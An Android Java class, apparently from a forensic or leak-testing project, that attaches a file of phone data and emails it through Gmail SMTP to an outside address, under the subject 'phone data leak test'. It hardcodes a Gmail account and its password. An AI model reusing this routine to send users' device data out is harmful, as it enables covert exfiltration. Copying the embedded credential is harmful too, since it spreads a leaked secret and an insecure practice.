package com.dforensic.test.phonedata;

import java.io.File;
import java.io.UnsupportedEncodingException;
import java.util.Properties;

import javax.activation.DataHandler;
import javax.activation.FileDataSource;
import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.Multipart;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeBodyPart;
import javax.mail.internet.MimeMessage;
import javax.mail.internet.MimeMultipart;

import android.os.AsyncTask;
import android.util.Log;

public class SendPhoneData {

	public void sendFile(File file) {
		Session session = createSessionObject();
		if (session != null) {
			Exception error = null;
			try {
				Message msg = createMessage("zeookr@gmail.com",
						"phone data leak test",
						"This message is sent for test purposes.", session);
				if (msg != null) {
					attachFile(msg, file);
					new SendMailTask().execute(msg);
				} else {
					Log.e(Constants.APP_NAME, "Message was not created.");
				}
			} catch (UnsupportedEncodingException e) {
				error = e;
			} catch (MessagingException e) {
				error = e;
			}
			if (error != null) {
				Log.e(Constants.APP_NAME, "Fail to create an e-mail messge.",
						error);
			}
		} else {
			Log.e(Constants.APP_NAME, "SMTP is not authorized.");
		}
	}

	private Session createSessionObject() {
		Properties properties = new Properties();
		properties.put("mail.smtp.auth", "true");
		properties.put("mail.smtp.starttls.enable", "true");
		properties.put("mail.smtp.host", "smtp.gmail.com");
		properties.put("mail.smtp.port", "587");

		return Session.getInstance(properties, new javax.mail.Authenticator() {
			protected PasswordAuthentication getPasswordAuthentication() {
				return new PasswordAuthentication("nikolay.lge@gmail.com",
						"1986nick");
			}
		});
	}

	private Message createMessage(String email, String subject,
			String messageBody, Session session) throws MessagingException,
			UnsupportedEncodingException {
		Message message = new MimeMessage(session);
		message.setFrom(new InternetAddress("nikolay.lge@gmail.com",
				"Nikolay LGE"));
		message.addRecipient(Message.RecipientType.TO, new InternetAddress(
				email, email));
		message.setSubject(subject);
		message.setText(messageBody);

		return message;
	}

	private void attachFile(Message msg, File file) throws MessagingException {
		Multipart mp = new MimeMultipart();
		// MimeBodyPart htmlPart = new MimeBodyPart();
		// htmlPart.setContent(body, "text/html");
		// mp.addBodyPart(htmlPart);

		MimeBodyPart messageBodyPart = new MimeBodyPart();
		if (file != null) {
			FileDataSource fileDataSource = new FileDataSource(file);
			messageBodyPart.setDataHandler(new DataHandler(fileDataSource));
			messageBodyPart.setFileName(file.getName());
			mp.addBodyPart(messageBodyPart);
		} else {
			Log.e(Constants.APP_NAME, "A file to send is NULL.");
		}

		msg.setContent(mp);
	}

	private class SendMailTask extends AsyncTask<Message, Void, Void> {

		@Override
		protected void onPreExecute() {
			super.onPreExecute();
		}

		@Override
		protected void onPostExecute(Void aVoid) {
			super.onPostExecute(aVoid);
		}

		@Override
		protected Void doInBackground(Message... messages) {
			try {
				Transport.send(messages[0]);
			} catch (MessagingException e) {
				e.printStackTrace();
			}
			return null;
		}
	}

}
